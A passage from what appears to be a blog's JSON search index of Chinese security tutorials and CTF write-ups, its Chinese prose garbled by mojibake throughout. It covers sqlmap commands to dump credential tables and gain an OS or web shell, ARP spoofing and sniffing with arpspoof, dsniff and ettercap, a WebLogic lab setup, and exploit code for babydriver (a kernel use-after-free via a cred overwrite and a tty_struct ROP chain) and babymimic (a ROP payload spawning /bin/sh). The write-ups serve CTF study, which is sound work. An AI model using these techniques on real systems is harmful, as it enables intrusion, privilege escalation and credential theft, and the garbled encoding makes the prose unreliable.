--columns\n\nâ‘¤ä¾æ®å±æ€§å­—æ®µæŸ¥æ‰¾æƒ³è¦çš„æ•°æ®ï¼šsqlmap -u ip -D database_name -T table_name -C column_1,column_2... --dump\n\n(ä¾‹å¦‚tableä¸­å¯èƒ½å°±ä¿å­˜id,username,passwordçš„å±æ€§ï¼Œå°±å¯ä»¥æŸ¥æ‰¾è´¦å·å¯†ç å‡ºæ¥)\n\n \n\nâ–²é’ˆå¯¹ç™»å½•æ¡†çš„SQLæ³¨å…¥ï¼šPOSTå‹\n\nâ‘ åˆ©ç”¨burpsuiteæŠ“è¯·æ±‚ç™»å½•çš„åŒ…ï¼ŒæŸ¥çœ‹(éœ€è¦å…ˆè®¾ç½®ä»£ç†ï¼Œç„¶åæ‹¦æˆªï¼Œ8080å¯èƒ½ä¸è¡Œï¼Œå¾—å…¶å®ƒç«¯å£ä»£ç†)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191504869.png)\n\nusername=admin&password=admin&authorization=\n\næœ€ä¸‹é¢çš„è¿™ä¸ªåŸºæœ¬å°±æ˜¯æˆ‘ä»¬ä¼ è¾“çš„è¯·æ±‚ç™»å½•ä¿¡æ¯ã€‚\n\nâ‘¡ç„¶åå°†è¿™äº›å†…å®¹ä¿å­˜ä¸‹æ¥ï¼Œç”Ÿæˆä¸€ä¸ªæ–‡ä»¶sql.txtï¼Œå°†è¿™ä¸ªæ–‡ä»¶ç”¨sqlmapè¿è¡Œåˆ†æï¼š\n\nsqlmap -r sql.txt\n\nè¿™æ ·å°±å¼€å§‹ä»sql.txtæ–‡ä»¶ä¸­åˆ†æäº†ï¼Œåˆ¤æ–­åˆ°åº•æœ‰æ²¡æœ‰sqlæ³¨å…¥æ¼æ´ï¼Œæœ‰çš„è¯å°±åº”è¯¥æœ‰å¯¹åº”çš„payloadç”Ÿæˆå‡ºæ¥ã€‚\n\nâ–²ä¹‹åå°±ç±»ä¼¼ä¸Šé¢çš„ï¼Œè·å–æ•°æ®åº“ï¼Œtableç­‰ç­‰ä¿¡æ¯ï¼Œä»è€Œæœ€ç»ˆè·å–æœåŠ¡å™¨çš„ç™»å½•è´¦å·å’Œå¯†ç ã€‚\n\n \n\nâ–²å…¶å®ƒç±»å‹çš„æµ‹è¯•ï¼šæµ‹è¯•å…±5çº§\n\næµ‹è¯•æ³¨å…¥æ—¶åŠ ä¸Šå‚æ•°--level=LEVEL\n\nâ‘ é»˜è®¤ï¼šGETå’ŒPOSTæµ‹è¯•\n\nâ‘¡2çº§ï¼šæµ‹è¯•cookieï¼š\n\n(çœ‹æœåŠ¡å™¨ä¼šä¸ä¼šæ ¹æ®cookieæ¥è·å–ç”¨æˆ·æ•°æ®)\n\nsqlmap -r sql.txt --level=2\n\nâ‘¡3çº§ï¼šæµ‹è¯•HTTP User-Agent/Refererå¤´çš„å€¼\n\n \n\n3.SQL-Shellï¼š\n\n(1)é€šè¿‡æ¼æ´è¿›å…¥SQL-Shellï¼š\n\nsqlmap -r sql.txt --level=5 --sql-shell\n\nè¿™æ ·å¦‚æœèƒ½è¿›å…¥å°±å¯ä»¥ç›´æ¥ç”¨SQLè¯­å¥æ¥æŸ¥è¯¢æ•°æ®\n\n(2)é€šè¿‡æ¼æ´è¿›å…¥OS-shellï¼š\n\nsqlmap -r sql.txt --level=5 --os-shell\n\nâ‘ ä¹‹åéœ€è¦é€‰æ‹©Webç«™ç‚¹çš„æ­å»ºè¯­è¨€ï¼Œé€šè¿‡æ’ä»¶æˆ–è€…å…¶å®ƒå½¢å¼åˆ¤æ–­(php,jspç­‰ç­‰)\n\nâ‘¡ç„¶åéœ€è¦è¾“å…¥ä¸€ä¸ªå¯ä»¥å¾€é‡Œé¢å†™ä¸œè¥¿çš„æ–‡ä»¶ç›®å½•ï¼šä¾‹å¦‚/var/www/upload\n\nè¿™é‡Œç›®å½•å¯ä»¥é€šè¿‡å·¥å…·æ¥æŸ¥æ‰¾ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ngit clone https://github.com/maurosoria/dirsearch\ncd dirsearch\npython3 dirsearch.py -u ip\n```\n\n \n\nè¿™æ ·sqlmapå°±å¯ä»¥ä¸Šä¼ ä¸œè¥¿ï¼Œå†™å…¥ä¸€äº›ç±»ä¼¼äºweb-shellç­‰ä¸œè¥¿ï¼Œä»è€Œè·å–æƒé™ã€‚\n\nâ‘¢é‚£ä¹ˆå°±è¿›å…¥os-shelläº†ï¼Œå¯ä»¥è·å–åˆ°æœåŠ¡å™¨æƒé™\n","tags":["WEB"],"categories":["WEB"]},{"title":"arpæ¬ºéª—","url":"/2021/08/19/6.ARPæ¬ºéª—/","content":"\n1.é¦–å…ˆæŸ¥çœ‹å’Œè‡ªå·±åŒå±ä¸€ä¸ªç½‘æ®µä¸‹çš„ipï¼š\n\nnbtscan -r 192.168.80.167/24\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503723.png)\n\nè¿™é‡Œ157å³ä¸ºç›®æ ‡ipï¼Œ167å³ä¸ºæœ¬æœºæ”»å‡»ip\n\n(è¿™ä¸ªéœ€è¦apt-get install nbtscan)\n\n2.ç„¶åä½¿ç”¨å·¥å…·arpspoofè¿›è¡Œæ¬ºéª—ï¼Œkalilinuxè‡ªå¸¦ï¼š\n\n(1)arpspoof -i eth0 -t 192.168.80.157 192.168.80.2\n\n(eth0æ˜¯ç½‘å¡æ¥å£ï¼Œ-tåæ˜¯ç›®æ ‡ipï¼Œä¹‹åçš„ipæ˜¯è¯¥ç½‘æ®µä¸‹çš„é»˜è®¤è·¯ç”±ipï¼Œå¯ä»¥é€šè¿‡route -næŸ¥è¯¢ï¼Œæˆ–è€…å…¶å®ƒæ–¹å¼)\n\nâ–²è¿™ä¸ªåŸç†å°±æ˜¯ä¿®æ”¹å·±æ–¹çš„Macåœ°å€ä¸ºé»˜è®¤è·¯ç”±çš„Macåœ°å€ï¼Œé‚£ä¹ˆç›®æ ‡ä¸»æœºå‘å‡ºçš„MACå¸§å°±ä¼šè¢«å·±æ–¹æ¥æ”¶ã€‚\n\n(2)å¦‚æœæ”»å‡»æœºå¼€å¯äº†Ipv4çš„è·¯ç”±è½¬å‘åŠŸèƒ½ï¼Œé‚£ä¹ˆarpæ¬ºéª—ä¸ä¼šæˆåŠŸï¼Œå› ä¸ºåˆ°è¾¾æ”»å‡»æœºçš„åŒ…è¢«è½¬å‘å‡ºå»äº†ã€‚\n\nâ‘ æŸ¥çœ‹å·±æ–¹çš„è·¯ç”±è½¬å‘åŠŸèƒ½æ˜¯å¦å¼€å¯ï¼š\n\ncat /proc/sys/net/ipv4/ip_forward\n\nä¸º0åˆ™å…³é—­ï¼Œä¸º1åˆ™å¼€å¯äº†ã€‚\n\nâ‘¡ä¿®æ”¹è·¯ç”±è½¬å‘åŠŸèƒ½ï¼š\n\necho \"0\" > /proc/sys/net/ipv4/ip_forward\n\nè¿™è¡Œå‘½ä»¤æ˜¯å¾€è¯¥æ–‡ä»¶ä¸­å†™å…¥0ï¼Œå…³é—­è·¯ç”±è½¬å‘åŠŸèƒ½\n\nsysctl -p(è®©æœåŠ¡å³å¯ç”Ÿæ•ˆ)\n\nâ–²å¦å¤–æ°¸ä¹…å¼€å¯æœåŠ¡çš„ç›¸å…³å‘½ä»¤å¯ä»¥ä¸Šç½‘å†æŸ¥\n\n3.æŸ¥çœ‹è‡ªå·±æ˜¯å¦è¢«ARPæ¬ºéª—æ”»å‡»ï¼šarp -a\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503844.png)\n\nå¯ä»¥çœ‹åˆ°åœ¨ç›®æ ‡æœºå™¨ä¸Šåœ¨æ²¡æœ‰è¢«æ”»å‡»ä¹‹å‰ï¼Œé»˜è®¤è·¯ç”±ipå¯¹åº”çš„macåœ°å€å’Œæ”»å‡»æœºipå¯¹åº”çš„macåœ°å€æ˜¯ä¸ä¸€æ ·çš„ï¼Œä½†æ˜¯è¢«æ”»å‡»ä¹‹åå´å˜æˆä¸€æ ·çš„äº†ã€‚\n\nâ–²è§£å†³åŠæ³•ï¼š\n\n(1)å°†dnsæœåŠ¡å™¨ipå’Œmacé™æ€ç»‘å®š:\n\narp -s [dns_ip] [dns_mac]\n\n(2)å¦‚æœä¸çŸ¥é“åŸæ¥çš„dnsæœåŠ¡å™¨çš„macåœ°å€ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆarp -dæ¸…ç©ºä¸€ä¸‹arpç¼“å­˜ï¼Œç„¶åarp -aæŸ¥çœ‹ï¼Œè¿™æ—¶å€™åŸæœ¬çš„dnsæœåŠ¡å™¨å°±ä¼šå‘è¿‡æ¥åŒ…ï¼Œå…¶MACå°±èƒ½è¢«çœ‹åˆ°ã€‚\n\n(3)å¦‚æœæ”»å‡»è€…ä¸€ç›´æ‰§è¡Œæ¬ºéª—ç¨‹åºï¼Œå¼€å¯ç³»ç»Ÿé˜²ç«å¢™åæ¸…ç©ºarpç¼“å­˜ï¼Œä¹Ÿèƒ½æŠµå¾¡ä¸€èˆ¬çš„arpæ¬ºéª—ã€‚\n\n(4)å¦‚æœé˜²ç«å¢™è¿˜æ˜¯æŠµå¾¡ä¸äº†ï¼Œæˆ–è€…ä¸å…è®¸å¼€å¯é˜²ç«å¢™ï¼Œé‚£ä¹ˆå°±è¿›è¡ŒæŠ“åŒ…ï¼Œå…ˆå°†arpç¼“å­˜æ¸…ç©ºï¼Œä¹‹åæŠ“å–dnsæœåŠ¡å™¨å‘è¿‡æ¥çš„åŒ…ï¼Œå…¶MACä¸€å®šæ­£ç¡®ï¼Œå°†è¯¥MACåœ°å€ä¸dnsæœåŠ¡å™¨ipç»‘å®šã€‚(æ²¡æœ‰æŠ“åŒ…å·¥å…·å°±é‡å¤æ¸…ç©ºç¼“å­˜ï¼ŒæŸ¥è¯¢ï¼Œå¤§ä¸äº†æ•´ä¸ªbatæ‰¹å¤„ç†ï¼Œä¸€å®šä¼šæœ‰æ”»å‡»è€…æ”»å‡»é—´éš™ä½¿å¾—dnsæœåŠ¡å™¨å‘è¿‡æ¥çš„åŒ…è¢«è§£æï¼Œç„¶åå†ç»‘å®š)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503433.png)\n\n(5)å¦‚æœæ”»å‡»è€…å……å½“ä¸­é—´äººï¼Œæˆªå–dnså‘ç»™å—å®³è€…çš„æœåŠ¡åŒ…...é‚£å†è¯´ï¼Œä¼°è®¡åªèƒ½ç ´å¯†äº†ã€‚\n\nâ–²å¯ä»¥äº‹å…ˆå°†DNSçš„MACå®šæœŸå¤‡ä»½ï¼Œå®šæœŸåˆ é™¤ã€‚\n\n4.å¼€å¯ç›®æ ‡æœºç½‘ç»œåŠŸèƒ½ï¼Œæˆªå–ç›®æ ‡æœºçš„æ•°æ®åŒ…ï¼š\n\nâ–²ä½¿ç”¨çš„å·¥å…·åœ¨ä¸åŒåè®®å’Œä¸åŒç¯å¢ƒçš„æŠ“å–èƒ½åŠ›éƒ½ä¸å¤ªä¸€æ ·\n\n(1)ä½¿ç”¨DSniffï¼Œæ”¯æŒTelnet ã€Ftpã€Smtpã€P0P3ã€HTTPï¼Œä»¥åŠå…¶å®ƒçš„ä¸€äº›é«˜å±‚ç½‘ç»œåº”ç”¨åè®®ï¼Œç”¨Telnetæ¯”è¾ƒå¥½ç”¨ã€‚æ¯”è¾ƒè€äº†ï¼Œå¾ˆå¤šæ€æ¯’è½¯ä»¶æˆ–è€…é˜²ç«å¢™å®‰å…¨æªæ–½ä»€ä¹ˆçš„éƒ½å¯ä»¥å‘ç°ã€‚\n\ndsniff -i eth0(æœ‰æ—¶å€™ä¸å¤ªå¥½ç”¨)\n\n(2)ä½¿ç”¨Ettercap\nettercap -Tq -i eth0(Tqæ˜¯å‚æ•°ç”¨çš„ï¼Œè¿‡æ»¤æ‰ä¸å¿…è¦çš„åŒ…)\n\n \n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"5.åˆ©ç”¨Cobaltstrikeè·å–æƒé™","url":"/2021/08/19/5.åˆ©ç”¨Cobaltstrikeè·å–æƒé™/","content":"\nä¸€ã€æ”»å‡»weblogic(ç«¯å£åŸºäº7001)ï¼š\n\nâ–²å‰ç½®ç¯å¢ƒéƒ¨ç½²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ngit clone https://github.com/vulhub/vulhub.git\ncd  vulhub/\ncd  weblogic/\ncd CVE-......(é€‰æ‹©ä¸€ç§æ¼æ´)\ndocker-compose up -d\n```\n\nè¿™æ ·å°±æ­å»ºäº†å¥½äº†è¯¥æ¼æ´çš„ç¯å¢ƒï¼Œä½¿ç”¨docker ps -aå¯ä»¥çœ‹åˆ°ç«¯å£æ˜ å°„åˆ°æœ¬åœ°ï¼Œæ‰€ä»¥åœ¨æœ¬åœ°è¾“å…¥127.0.0.1:7001å³å¯çœ‹åˆ°å¯¹åº”çš„weblogicæœåŠ¡ã€‚\n\nè¾“å…¥127.0.0.1:7001/consoleå¯ä»¥è¿›å…¥åˆ°æœåŠ¡ç•Œé¢\n\n \n\n1.åˆ©ç”¨WeblogicScanå…ˆæ‰«æçœ‹çœ‹æœ‰æ²¡æœ‰weblogicçš„æ¼æ´:\n\n```\n#æ³¨é‡Šå¤´\n\ngit clone https://github.com/dr0op/WeblogicScan.git\ncd WeblogicScan\npip3 install -r requirements.txt\npython3 WeblogicScan.py ip 7001\n```\n\n2.æœ‰cveæ¼æ´åä¸Šç½‘æœç´¢å¯¹åº”çš„åˆ©ç”¨pocæ¥æ‰“æ”»å‡»\n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"CISCN2017-babydriver","url":"/2021/08/19/CISCN2017-babydriver/","content":"\n1.å¸¸è§„è§£åŒ…åˆ†æ:\n\n```\n//æ³¨é‡Šå¤´\n\nmkdir rootfs\ncd rootfs\nmv ../rootfs.cpio rootfs.cpio.gz //æ”¹åï¼Œæ–¹ä¾¿gunzipè¯†åˆ«æ ¼å¼\ngunzip ./rootfs.cpio.gz //è§£å‹\ncpio -idm < ./rootfs.cpio //å†æ¬¡è§£å‹\n```\n\n2.æŸ¥çœ‹init\n\n```\n#æ³¨é‡Šå¤´\n\n#!/bin/sh\n\nmount -t proc none /proc\nmount -t sysfs none /sys\nmount -t devtmpfs devtmpfs /dev\nchown root:root flag\nchmod 400 flag\nexec 0</dev/console\nexec 1>/dev/console\nexec 2>/dev/console\n\ninsmod /lib/modules/4.4.72/babydriver.ko\nchmod 777 /dev/babydev\necho -e \"\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n\"\nsetsid cttyhack setuidgid 1000 sh\n\numount /proc\numount /sys\npoweroff -d 0 -f\n```\n\nå¯ä»¥çœ‹åˆ°åŠ è½½äº†/lib/modules/4.4.72/babydriver.koæ¨¡å—ï¼Œæƒé™ä¸º1000å³æ™®é€šæƒé™ï¼Œä½†æ˜¯flagåœ¨root/ä¸‹ï¼Œéœ€è¦rootæƒé™ï¼Œé‚£ä¹ˆéœ€è¦ææƒã€‚\n\n3.æŸ¥çœ‹å¯åŠ¨qemuå‘½ä»¤ï¼š\n\n```\n#!/bin/bash\n\nqemu-system-x86_64\\ \n-initrd rootfs.cpio\\\n-kernel bzImage \\\n-append 'console=ttyS0 root=/dev/ram oops=panic panic=1'\\\n-enable-kvm \\\n-monitor /dev/null \\\n-m 64M \\\n--nographic\\\n-smp cores=1,threads=1 \\\n-cpu kvm64,+smep\\\n```\n\nå¾ˆå¸¸è§„ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯å¼€å¯äº†smepä¿æŠ¤\n\n4.IDAæ‰“å¼€åˆ†æåŠ è½½çš„babydriver.koæ¨¡å—ï¼Œä¸€èˆ¬æ¼æ´å°±åœ¨è¿™é‡Œï¼Œè¿™é‡Œå°±æ˜¯UAFæ¼æ´ï¼Œæ¼æ´ç‚¹åœ¨å…¨å±€å˜é‡çš„è®¾ç½®ï¼š\n\nâ–²ç”¨åˆ°çš„çŸ¥è¯†ç‚¹ï¼šè¿™é‡Œç”±äºæ˜¯linuxå†…æ ¸ï¼Œé‚£ä¹ˆå½“Linuxå†…æ ¸æ¨¡å—é“¾æ¥åˆ°å†…æ ¸ä¸­ï¼Œå¦‚æœåœ¨Koæ¨¡å—çš„æºä»£ç ä¸­å®ƒä»¬å…·æœ‰å…¨å±€å˜é‡ï¼Œåˆ™æ¯ä¸ªå…¨å±€å˜é‡åªæœ‰ä¸€ä¸ªå‰¯æœ¬ï¼Œæ¯ä¸ªkoæ¨¡å—çš„è®¾å¤‡ç¨‹åºå…±äº«è¿™ä¸ªå…¨å±€å˜é‡\n\n(1)ç”±äºbabydev_structæ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œæ‰€ä»¥æ‰“å¼€ä¸¤ä¸ªbabydriver.koè®¾å¤‡ä¹‹åï¼Œç¬¬ä¸€ä¸ªè®¾å¤‡ç¨‹åºfd1ä½¿ç”¨command == 0x10001è°ƒç”¨babyioctlå‡½æ•°ï¼Œç”³è¯·å †å—åï¼Œå¦‚æœç¬¬äºŒä¸ªè®¾å¤‡ç¨‹åºfd2å†è°ƒç”¨babyioctlå‡½æ•°ç”³è¯·å †å—ï¼Œåˆ™ä¼šè¦†ç›–æ‰babydev_struct.device_bufã€‚\n\n(2)é‚£ä¹ˆå¦‚æœå°†ç¬¬ä¸€ä¸ªè®¾å¤‡é‡Šæ”¾æ‰ï¼Œåˆ™babydev_struct.device_bufæŒ‡å‘çš„å†…å­˜ä¼šè¢«æ ‡è®°ä¸ºé‡Šæ”¾çŠ¶æ€ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥é€šè¿‡fd2æ¥ä¿®æ”¹è¿™å—å†…å­˜ï¼Œé€ æˆUAFã€‚\n\n(3)æœ€å¼€å§‹é€šè¿‡è°ƒç”¨babyioctlå‡½æ•°å°†è¿™å—å†…å­˜å¤§å°ä¿®æ”¹ä¸ºsizeçš„å †å—ï¼Œä¹‹åå¦‚æœå†ç”³è¯·sizeå¤§å°çš„å†…å­˜ï¼Œå°±ä¼šå…ˆå°†è¿™å—å†…å­˜ç”³è¯·å›æ¥ï¼Œç„¶åæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡UAFä½¿ç”¨fd2æ¥ä¿®æ”¹è¿™å—æœ¬ä¸åº”è¯¥èƒ½ä¿®æ”¹çš„å†…å­˜ã€‚\n\n(4)è¿™æ—¶å°±è€ƒè™‘å°†è¿™å—å†…å­˜ç”³è¯·æˆä»€ä¹ˆæ ·çš„å†…å­˜æ¥åˆ©ç”¨ï¼Œè¿™é‡Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ã€‚\n\nâ–²æ–¹æ³•ä¸€ï¼šåˆ©ç”¨credç»“æ„ä½“\n\nåœ¨kernelä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šåˆ›å»ºä¸€ä¸ªcredç»“æ„ä½“ï¼Œç”¨æ¥å­˜å‚¨è¿›ç¨‹çš„æƒé™ç­‰ä¿¡æ¯\n\nâ‘ ä¿®æ”¹sizeå¤§å°ä¸ºcredç»“æ„ä½“å¤§å°ï¼Œå†åˆ©ç”¨forkåˆ›å»ºå­è¿›ç¨‹ï¼Œè¿‡ç¨‹ä¸­ä¼šåˆ›å»ºçš„credç»“æ„ä½“ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†è¿™å—å†…å­˜å˜æˆå­è¿›ç¨‹çš„credç»“æ„ä½“ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\n// æ‰“å¼€ä¸¤æ¬¡è®¾å¤‡ï¼Œè§¦å‘ä¼ªæ¡ä»¶ç«äº‰\nint fd1 = open(\"/dev/babydev\", 2);\nint fd2 = open(\"/dev/babydev\", 2);\n\n// ä¿®æ”¹ babydev_struct.device_buf_len ä¸º sizeof(struct cred)\nioctl(fd1, 0x10001, 0xa8);\n\n// é‡Šæ”¾fd1\nclose(fd1);\n\n// æ–°èµ·è¿›ç¨‹çš„ cred ç©ºé—´ä¼šå’Œåˆšåˆšé‡Šæ”¾çš„ babydev_struct é‡å \nint pid = fork();\n```\n\nâ‘¡ä¹‹åä¿®æ”¹å­è¿›ç¨‹credä¸­çš„uidï¼Œgidä¸º0ï¼Œä½¿å…¶ä¸ºrootæƒé™ï¼Œå³å¯å°†å­è¿›ç¨‹ææƒã€‚ææƒä¹‹åå³å¯è°ƒç”¨system(\"/bin/sh\")è·å¾—rootæƒé™çš„shellã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nif(pid < 0)\n{\n    puts(\"[*] fork error!\");\n    exit(0);\n}\n\nelse if(pid == 0)\n{\n    // é€šè¿‡æ›´æ”¹ fd2ï¼Œä¿®æ”¹æ–°è¿›ç¨‹çš„ cred çš„ uidï¼Œgid ç­‰å€¼ä¸º0\n    char zeros[30] = {0};\n    write(fd2, zeros, 28);\n\n    if(getuid() == 0)\n    {\n        puts(\"[+] root now.\");\n        system(\"/bin/sh\");\n        exit(0);\n    }\n}\n\nelse\n{\n    wait(NULL);\n}\nclose(fd2);\n```\n\nâ–²æ–¹æ³•äºŒï¼šæ‰“å¼€è®¾å¤‡ptmxï¼Œåˆ©ç”¨åˆ›å»ºçš„tty_structç»“æ„ä½“å’Œä¿®æ”¹å‡½æ•°æŒ‡é’ˆæ¥ROPã€‚\n\n(ä¸€èˆ¬ROPçš„è°ƒç”¨éœ€è¦å…³æ‰smepä¿æŠ¤)\n\nâ‘ ä¿®æ”¹sizeå¤§å°ä¸ºtty_structç»“æ„ä½“å¤§å°ï¼Œé‡Šæ”¾ç©ºé—´ï¼Œä¹‹åç”¨æˆ·ç©ºé—´æ‰“å¼€ptmxè®¾å¤‡ï¼Œå°±ä¼šå°†è¿™å—å†…å­˜ç”³è¯·ä¸ºtty_structç»“æ„ä½“ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nint fd1 = open(\"/dev/babydev\", O_RDWR);\nint fd2 = open(\"/dev/babydev\", O_RDWR);\nioctl(fd1, 0x10001, 0x2e0);\nclose(fd1);\nint fd_tty = open(\"/dev/ptmx\", O_RDWR|O_NOCTTY);\n```\n\nâ‘¡ä¿®æ”¹tty_structç»“æ„ä½“ä¸­çš„const struct tty_operations *ops;æŒ‡é’ˆæŒ‡å‘ç”¨æˆ·ç©ºé—´ä¼ªé€ çš„fake_tty_operationsç»“æ„ä½“ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nsize_t fake_tty_struct[4] = {0};\nread(fd2, fake_tty_struct, 32);\nfake_tty_struct[3] = (size_t)fake_tty_operations;\n```\n\nâ‘¢å°†ç”¨æˆ·ç©ºé—´çš„fake_tty_operationsä¸­çš„writeå‡½æ•°æŒ‡é’ˆæŒ‡å‘ROPé“¾ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nvoid* fake_tty_operations[30];\n--------------------------------------------------------------------\nfor(int i = 0; i < 30; i++)\n{\n    fake_tty_operations[i] = 0xFFFFFFFF8181BFC5;\n}\nfake_tty_operations[0] = 0xffffffff810635f5; //pop rax; pop rbp; ret;\nfake_tty_operations[1] = (size_t)rop;\nfake_tty_operations[3] = 0xFFFFFFFF8181BFC5; // mov rsp,rax ; dec ebx ; ret\n---------------------------------------------------------------------\nint i = 0;\nsize_t rop[32] = {0};\nrop[i++] = 0xffffffff810d238d;\t\t// pop rdi; ret;\nrop[i++] = 0x6f0;\nrop[i++] = 0xffffffff81004d80;\t\t// mov cr4, rdi; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = (size_t)get_root;\nrop[i++] = 0xffffffff81063694;\t\t// swapgs; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = 0xffffffff814e35ef;\t\t// iretq; ret;\nrop[i++] = (size_t)get_shell;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n \n\nâ‘£å‘ptmxè®¾å¤‡å†™å…¥å†…å®¹ï¼Œå³å¯è°ƒç”¨writeå‡½æ•°ä»è€Œè°ƒç”¨ROPé“¾ã€‚\n\nâ‘¤åˆ©ç”¨ROPé“¾å…³æ‰sempä¿æŠ¤ï¼Œä¹‹åRet2Usrå³å¯ã€‚\n\n \n\n \n\n \n","tags":["mimic"],"categories":["pwn-kernel","Kernel-ROP","Kernel-UAF"]},{"title":"QWB2019-babymimic","url":"/2021/08/19/QWB2019-babymimic/","content":"\nPWNæ‹Ÿæ€é¢˜ï¼Œéœ€è¦æˆ‘ä»¬é’ˆå¯¹ä¸¤ä¸ªç¨‹åºè¾“å…¥è¾“å‡ºå®Œå…¨ä¸€è‡´ï¼Œexpè¦åŒæ—¶èƒ½å¤Ÿæ‰“ç©¿ä¸¤ä¸ªç¨‹åºã€‚å‰æœŸçš„çˆ†ç ´ä»€ä¹ˆçš„å°±ä¸çœ‹äº†ï¼Œçœ‹[EXå¸ˆå‚…çš„åšå®¢](http://blog.eonew.cn/archives/1009)å°±å¥½äº†\n\n1.ç¨‹åºåˆ†ä¸ºstkof32å’Œstkof64ï¼Œå¤§å¤šéƒ½ç›¸åŒï¼Œåªæ˜¯ä¸€ä¸ªæ˜¯64ä¸€ä¸ªæ˜¯32ï¼Œç„¶åç¨‹åºæ˜¯æ ‡å‡†æ ˆæº¢å‡ºï¼Œåç§»ä¸åŒï¼Œ32ä½ä¸º272å­—èŠ‚ï¼Œ64ä½ä¸º280å­—èŠ‚ï¼Œç›¸å·®8ä¸ªå­—èŠ‚ã€‚è¿™é‡Œå°±ä¸ºä¸€ä¸ªexpæ”»ç ´ä¸¤ä¸ªç¨‹åºæä¾›äº†æ¼æ´ï¼Œå¦å¤–ç”±äºç¨‹åºæ²¡æœ‰å¼€PIEï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ROPã€‚\n\n2.è¿™é‡Œå°±ç”¨ç›¸å·®çš„8ä¸ªå­—èŠ‚ï¼Œå³32ä½ç¨‹åºä¼šæ¯”64ä½çš„å¤šè¿è¡Œä¸¤ä¸ªæŒ‡ä»¤ï¼Œé‚£ä¹ˆå°±é’ˆå¯¹è¿™ä¸¤ä¸ªæŒ‡ä»¤æ¥åšæ–‡ç« ã€‚\n\n3.è¿™é‡Œå°±æ˜¯å°†64ä½ç¨‹åºçš„ROPé“¾ç›´æ¥æ”¾åœ¨retåœ°å€ä¸Šï¼Œ32ä½ç¨‹åºåˆ©ç”¨å¤šå‡ºæ¥çš„ä¸¤ä¸ªæŒ‡ä»¤ï¼Œä¸‹æ‹‰espï¼ŒæŠŠROPé“¾æ”¾åœ¨64ä½ROPé“¾çš„åé¢ï¼š\n\n(1)64ä½ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n#function(rdi,rsi,rdx)\n\n#read /bin/sh\npayload += p64(pop_rax_ret) + p64(0x0)\npayload += p64(pop_rdi_ret) + p64(0x0)\npayload += p64(pop_rsi_ret) + p64(0x0069e200)\npayload += p64(pop_rdx_ret) + p64(0x200)\npayload += p64(syscall)\n\n#execve(\"/bin/sh\",0,0)\npayload += p64(pop_rax_ret) + p64(0x3b)\npayload += p64(pop_rdi_ret) + p64(0x0069e200)\npayload += p64(pop_rsi_ret) + p64(0x0)\npayload += p64(pop_rdx_ret) + p64(0x0)\npayload += p64(syscall)\n```\n\n(2)32ä½ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n#function(ebx,ecx,edx)\n\n#read /bin/sh \npayload += p32(pop_edx_ecx_edx_ret)\npayload += p32(0x200)+p32(0x080d7200)+p32(0x0)\npayload += p32(pop_eax_ret) + p32(0x3)\npayload += p32(int0x80)\n\n#execve(\"/bin/sh\",0,0)\npayload += p32(pop_edx_ecx_ebx_ret)\npayload += p32(0x0)+p32(0x0)+p32(0x080d7200)\npayload += p32(pop_eax_ret) + p32(0xb)\npayload += p32(int0x80)\n```\n\n(3)ä¸‹æ‹‰rspï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += \"A\"*offset +p32(add_0x100) + p32(0x0)\n```\n\nâ–²è¿èµ·æ¥å°±æ˜¯ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n#add esp\npayload = \"\"\npayload += \"A\"*offset +p32(add_0x100) + p32(0x0)\n\n#read /bin/sh\npayload += p64(pop_rax_ret) + p64(0x0)\npayload += p64(pop_rdi_ret) + p64(0x0)\npayload += p64(pop_rsi_ret) + p64(0x0069e200)\npayload += p64(pop_rdx_ret) + p64(0x200)\npayload += p64(syscall)\n\n#execve(\"/bin/sh\",0,0)\npayload += p64(pop_rax_ret) + p64(0x3b)\npayload += p64(pop_rdi_ret) + p64(0x0069e200)\npayload += p64(pop_rsi_ret) + p64(0x0)\npayload += p64(pop_rdx_ret) + p64(0x0)\npayload += p64(syscall)\npayload.ljust(0x100-4,'\\x00')\n\n#read /bin/sh\npayload += p32(pop_edx_ecx_edx_ret)\npayload += p32(0x200)+p32(0x080d7200)+p32(0x0)\npayload += p32(pop_eax_ret) + p32(0x3)\npayload += p32(int0x80)\n\n#execve(\"/bin/sh\",0,0)\npayload += p32(pop_edx_ecx_ebx_ret)\npayload += p32(0x0)+p32(0x0)+p32(0x080d7200)\npayload += p32(pop_eax_ret) + p32(0xb)\npayload += p32(int0x80)\n```\n\nå…¶ä»–çš„å°±æ˜¯æ‰¾ROPäº†ï¼Œè¿™ä¸ªä¸è¯´äº†ï¼Œè¿™é‡Œèƒ½æ‰¾åˆ°è¿™ä¹ˆå¤šgadgetï¼Œçº¯ç²¹å°±æ˜¯å› ä¸ºç¨‹åºæ˜¯é™æ€çš„ï¼Œgadgetæ— 